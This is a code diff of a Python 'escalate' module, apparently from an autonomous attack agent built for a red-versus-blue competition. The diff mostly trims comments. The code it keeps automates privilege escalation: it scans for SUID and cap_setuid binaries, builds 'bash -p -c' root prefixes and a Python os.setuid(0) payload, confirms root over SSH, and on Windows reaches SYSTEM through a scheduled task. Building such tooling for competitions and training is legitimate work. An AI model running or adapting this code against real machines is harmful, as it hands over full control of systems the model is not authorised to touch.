@@ -1,52 +1,4 @@
-"""escalate — discover HOW root/SYSTEM is reachable on a box, then take it over.
-
-The label is the routing vocabulary the rest of the agent shares
-(`base.can_root` / `base.root_cmd`, `intel.escalation_label`, `policy`): it is
-WHERE the box records *how* root is reachable, so every later root command rides
-the path that was proven here instead of assuming one. The vocabulary is the
-earlier agent's, unchanged:
-
-  ``sudo``          passwordless sudo
-  ``sudo_pw``       sudo with the foothold's own password
-  ``escape:*``      a SUID escape binary invoked as a command prefix
-  ``capexec:*``     a cap_setuid (or SUID) binary invoked as a command prefix
-  ``system``        Windows: an Administrator session that reaches SYSTEM
-
-Two rules shape the port, both of them lessons from the earlier agent:
-
-1. **A label is only ever emitted after the shared wrapper has proved it.** Every
-   candidate mechanism is turned into the label it would record, then run through
-   `root_cmd("id", <the foothold wearing that label>)` — the exact command every
-   later root path will produce (`root_cmd` appends a command to the label's
-   prefix). The result is `ok=True` only if that proving command returned
-   ``uid=0``/``euid=0``. A label that cannot be re-run is not a routing label: the
-   earlier agent recorded ``escape:python3`` / ``capexec:<path>`` for one-shot
-   wrappers that embed the command inside their own argument, so every later
-   ``root_cmd`` on those boxes produced a broken command line and the failure
-   surfaced far away from the escalation. Here those binaries are *proved* (the
-   earlier agent's one-shot wrapper is still run, so a box that is rooted only
-   that way is reported as such) and then deliberately NOT labelled: the reason
-   goes in the notes and the detail says root is reachable but not routable,
-   which is the honest state.
-2. **Discovery order comes from intel, never from an assumption.** nakon knows
-   which misconfig families it planted (`intel.hints_for(ip)["escalation"]`,
-   e.g. ``capexec:pending-discovery``), so the hinted family is probed first;
-   nothing is skipped either way. Every probe, every failing probe and every
-   mechanism that was found-but-unusable lands in ``Result.data["notes"]`` *and*
-   in the box's ledger notes, so the ledger says why the mechanism was chosen.
-
-Already at the top = nothing to do: a root foothold is a no-op success (a
-standing label is re-verified first, and a label that stopped working is
-withdrawn from world state so `can_root()` cannot keep routing through a wrapper
-blue just broke). Nothing routable = ``ok=False`` with the discovery in the
-detail. A box whose only path is a one-shot escape is reported as such rather
-than silently escalated.
-
-No mechanism mutates the box on Linux (we execute what the competition already
-planted), so the undo is the record that nothing was installed. The Windows path
-lands SYSTEM via a one-shot scheduled task, cleans that task and its output file
-up in the same run, and records the cleanup as its restore recipe.
-"""
+"""escalate — discover HOW root/SYSTEM is reachable on a box, then take it over."""
 
 import json
 import re
@@ -56,15 +8,10 @@ from ..errors import GuardrailError, PolicyError
 from . import artifactnames as names
 from .base import Effect, Result, can_root, register, root_cmd
 
-# --- the discovery ladder ------------------------------------------------------
-
-# Mechanism families, weakest-assumption first. The earlier agent's order: the
-# clean win (passwordless sudo) first, then password sudo, then the planted
-# binaries.
+# weakest assumption first: clean wins, then the planted binaries
 FAMILIES = ("sudo", "sudo_pw", "suid", "capexec")
 
-# intel's hinted family is promoted to the front; the rest keep their order, so
-# a hint changes what we prefer, never what we are willing to try.
+# a hint changes what we prefer, never what we are willing to try
 HINT_ORDERS = {
     "sudo": ("sudo", "sudo_pw", "suid", "capexec"),
     "sudo_pw": ("sudo_pw", "sudo", "suid", "capexec"),
@@ -73,10 +20,8 @@ HINT_ORDERS = {
     "capexec": ("suid", "capexec", "sudo", "sudo_pw"),
 }
 
-# The proving command is ONE shell token on purpose: the shared `root_cmd` appends
-# it to the label's prefix, and `bash -p -c id` / `python3 -c id` only behave when
-# the command is a single word. `id` reports the effective uid, which is what a
-# SUID or sudo takeover changes.
+# ONE shell token: root_cmd appends it to the label's prefix, and `bash -p -c id`
+# / `python3 -c id` only behave with a bare word; `id` reports the effective uid.
 PROOF_CMD = "id"
 UID0_RE = re.compile(r"(?:^|\s)e?uid=0(?:\(|\s|$)")
 
@@ -85,20 +30,17 @@ SUID_SCAN = "find / -xdev -perm -4000 -type f 2>/dev/null | head -40"
 CAP_SCAN = ("command -v getcap >/dev/null 2>&1 && getcap -r / 2>/dev/null "
             "| grep -i cap_setuid | head -10")
 
-# SUID/capability binaries that can be turned into a command PREFIX (what the
-# shared root_cmd needs: `<prefix> <cmd>`). A shell clone is the clean case.
+# binaries usable as a command PREFIX (`<prefix> <cmd>`, what root_cmd needs)
 SHELL_SUFFIX = {"bash": "-p -c", "sh": "-p -c", "dash": "-p -c", "ksh": "-p -c",
                 "zsh": "-p -c", "env": "/bin/sh -p -c"}
 SHELL_ORDER = ("bash", "sh", "dash", "ksh", "zsh", "env")
 
-# Binaries whose escape needs the command EMBEDDED in their own argument (the
-# earlier agent's ESCAPES, minus the shells): usable one-shot, never as a
-# routing label.
+# escapes that embed the command in their own argument: usable one-shot,
+# never as a routing label
 ONE_SHOT = ("find", "python3", "python2", "python", "awk", "gawk", "mawk", "nawk",
             "perl")
 
-# Escalate is offered every cycle while the box has no root path; a box that has
-# none will never acquire one from us, so stop burning the discovery calls.
+# a box with no root path never acquires one from us: stop burning discovery calls
 FAILURE_LIMIT = 3
 
 
@@ -118,15 +60,12 @@ def redact(cmd, secret):
 
 
 def labelled(fh, label):
-    """The foothold wearing `label` — the input the shared router reads."""
     probe = dict(fh or {})
     probe["escalation"] = label
     return probe
 
 
 def one_shot_cmd(path, inner):
-    """The earlier agent's ESCAPES, keyed by the discovered path (command
-    embedded, one-shot)."""
     name = basename(path)
     if name.startswith("python"):
         payload = f"import os; os.setuid(0); os.system({json.dumps(inner)})"
@@ -185,8 +124,6 @@ class Escalate(Effect):
             ctx.world.note(ip, f"escalate: {line}")
         return result
 
-    # -- routing helpers ---------------------------------------------------------
-
     def _windows(self, ctx, ip, fh):
         return bool((fh or {}).get("windows")) or ctx.is_windows(ip)
 
@@ -195,7 +132,6 @@ class Escalate(Effect):
                     in ("administrator", "admin"))
 
     def _ssh(self, ctx, ip, fh, cmd, notes, timeout=60):
-        """One transport call. A box/network failure is a note, never a crash."""
         try:
             return ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "", cmd,
                                timeout=timeout, windows=self._windows(ctx, ip, fh),
@@ -203,8 +139,7 @@ class Escalate(Effect):
         except GuardrailError:
             raise
         except AssertionError:
-            # winexec's ship-time quoting invariant: a bug in OUR command shape,
-            # not a box failure — never report it as one.
+            # winexec's quoting invariant: a bug in OUR command shape, not a box failure
             raise
         except Exception as exc:
             notes.append(f"transport error on {short(cmd, 60)!r}: "
@@ -212,12 +147,8 @@ class Escalate(Effect):
             return None
 
     def _prove(self, ctx, ip, fh, label, notes, timeout=45):
-        """Run the label's OWN wrapper for `id` — the routing proof.
-
-        Returns ``(ok, redacted_command, evidence)``. This is the whole point of
-        the effect: the command that proves the label is byte-for-byte the command
-        every later `root_cmd(cmd, foothold)` will produce for that label.
-        """
+        """Run the label's OWN root_cmd wrapper for `id`: byte-for-byte what every
+        later root command will produce. This is the whole point of the effect."""
         cmd = root_cmd(PROOF_CMD, labelled(fh, label))
         safe = redact(cmd, fh.get("password"))
         res = self._ssh(ctx, ip, fh, cmd, notes, timeout=timeout)
@@ -230,20 +161,13 @@ class Escalate(Effect):
         return False, safe, f"rc={rc} {short(err or out)}"
 
     def _withdraw(self, ctx, ip, fh, label, notes):
-        """Drop a label that no longer routes.
-
-        `can_root()` is a string predicate, so a stale label keeps routing every
-        later root command through a wrapper blue just broke. Withdrawing it via
-        the public mutator is the difference between a loud "needs a root path"
-        rejection and a silent command-line corruption.
-        """
+        """A stale label is a string predicate that keeps routing broken wrappers;
+        withdrawing it turns silent corruption into a loud rejection."""
         ctx.world.add_foothold(ip, fh.get("user"), fh.get("password") or "", "user",
                                windows=bool(fh.get("windows")),
                                key_path=fh.get("key_path"), escalation="")
         notes.append(f"withdrew stale label {label!r} on {ip} — it no longer proves "
                      "root, and can_root() must not route through it")
-
-    # -- Linux -------------------------------------------------------------------
 
     def _linux_run(self, ctx, ip, fh, notes, mechanism):
         hint = (ctx.intel.hints_for(ip) or {}).get("escalation")
@@ -340,8 +264,8 @@ class Escalate(Effect):
             return None, None, "suid: no set-uid binary found"
         notes.append(f"set-uid binaries on {ip}: {short(', '.join(paths), 300)}")
 
-        # A shell clone is a command prefix (routable); the earlier agent tried
-        # find/python/awk first and recorded a label the router cannot re-run.
+        # shell clone is a command prefix (routable); one-shot escapes cannot be
+        # re-run by the router, so they are never labelled
         shells = sorted((p for p in paths if basename(p) in SHELL_SUFFIX),
                         key=lambda p: (SHELL_ORDER.index(basename(p)), p))
         for path in shells:
@@ -361,15 +285,14 @@ class Escalate(Effect):
         return None, None, "suid: no usable set-uid escape"
 
     def _note_other_escapes(self, paths, notes):
-        """The binaries we did NOT take over are evidence, not silence."""
+        """Binaries NOT taken over are evidence, not silence."""
         others = [p for p in paths if basename(p) in ONE_SHOT]
         if others:
             notes.append("also present (one-shot escapes, not routable — improvise "
                          "can use them): " + short(", ".join(sorted(others)), 200))
 
     def _one_shot_root(self, ctx, ip, fh, paths, notes):
-        """Prove (never label) the escapes that embed the command in their own
-        argument: the earlier agent's find/python3/awk wrappers."""
+        """Prove (never label) escapes that embed the command in their argument."""
         for path in sorted(p for p in paths if basename(p) in ONE_SHOT):
             cmd = one_shot_cmd(path, PROOF_CMD)
             if cmd is None:
@@ -428,8 +351,6 @@ class Escalate(Effect):
                                     "one-shot only")
         return None, None, "capexec: cap_setuid found but none routable"
 
-    # -- Windows -----------------------------------------------------------------
-
     def _windows_run(self, ctx, ip, fh, notes):
         if fh.get("escalation") == "system":
             notes.append("no-op: escalation=system already recorded")
@@ -476,8 +397,8 @@ class Escalate(Effect):
 
     def _windows_restore(self, task, out_file):
         return {"recipe": [
-            # idempotent: both are already gone — recorded so the organizer's
-            # table is complete and a re-run cannot leave the one-shot task behind
+            # idempotent: both are already gone; recorded so the organizer's table
+            # is complete and a re-run can't leave the one-shot task behind
             f"schtasks /Delete /TN '{task}' /F",
             f"Remove-Item -Path '{out_file}' -ErrorAction SilentlyContinue",
         ], "secrets": None}
